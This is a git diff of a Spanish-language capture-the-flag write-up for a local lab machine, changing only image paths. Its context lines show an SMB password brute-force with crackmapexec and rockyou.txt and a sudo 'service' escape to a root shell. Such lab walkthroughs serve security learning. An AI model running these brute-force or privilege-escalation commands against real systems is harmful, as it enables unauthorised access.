@@ -72,7 +72,7 @@ Descubrimos varios usuarios por lo que realizamos fuerza bruta con **crackmapexe
 crackmapexec smb 172.17.0.2 -u satriani7  -p /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos las credenciales por lo que vamos a enumerar los recursos compartidos del usuario.
 
@@ -153,4 +153,4 @@ Nos llama la atención **service** por lo que buscamos en esta [página ](https:
 sudo /usr/sbin/service ../../bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
